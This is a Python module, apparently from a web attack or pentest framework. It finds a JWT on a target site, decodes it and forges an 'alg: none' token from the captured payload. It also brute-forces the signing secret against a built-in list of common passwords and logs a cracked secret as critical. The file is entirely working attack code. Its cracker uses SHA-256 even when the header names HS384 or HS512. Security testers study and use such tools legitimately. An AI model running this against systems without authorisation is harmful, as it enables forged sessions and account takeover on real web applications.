"""jwt — JWT decode + weak-secret crack + none-algorithm attack"""
import base64, json, hmac, hashlib, re
from core.http import HttpClient

COMMON_SECRETS = ["secret","password","123456","jwt","key","admin","test","changeme",
                  "jwt_secret","my_secret","token","secretkey","supersecret","default"]

def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

class Jwt:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        r = http.get(session.target)
        if not r: return {}
        # look for JWT in cookies, headers, body
        token = None
        JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*")
        for m in JWT_RE.findall(r.text)[:5]:
            token = m; break
        if not token:
            for c in r.cookies:
                if JWT_RE.match(c.value): token = c.value; break
        if not token:
            print("[jwt] no token found"); return {"token": None}
        print(f"[jwt] token: {token[:60]}...")
        try:
            h, p, s = token.split(".")
            header = json.loads(b64d(h))
            payload = json.loads(b64d(p))
        except Exception as e:
            print(f"[jwt] decode error: {e}"); return {"token": token, "error": str(e)}
        print(f"  header: {header}")
        print(f"  payload: {payload}")
        logger.finding("jwt", "info", f"alg={header.get('alg')}")
        # alg=none
        if header.get("alg","").lower() != "none":
            forged = b64e(json.dumps({"alg":"none","typ":"JWT"}).encode()) + "." + \
                     b64e(json.dumps(payload).encode()) + "."
            print(f"  [test] none-alg token: {forged[:80]}...")
        # crack HS256
        if header.get("alg","").startswith("HS"):
            signing = f"{h}.{p}".encode()
            sig = b64d(s) if s else b""
            for sec in COMMON_SECRETS:
                if hmac.new(sec.encode(), signing, hashlib.sha256).digest() == sig:
                    print(f"  [!] CRACKED secret: {sec}")
                    logger.finding("jwt_secret", "critical", f"secret={sec}")
                    return {"token": token, "header": header, "payload": payload, "secret": sec}
            print(f"  no common secret found ({len(COMMON_SECRETS)} tried)")
        return {"token": token, "header": header, "payload": payload}
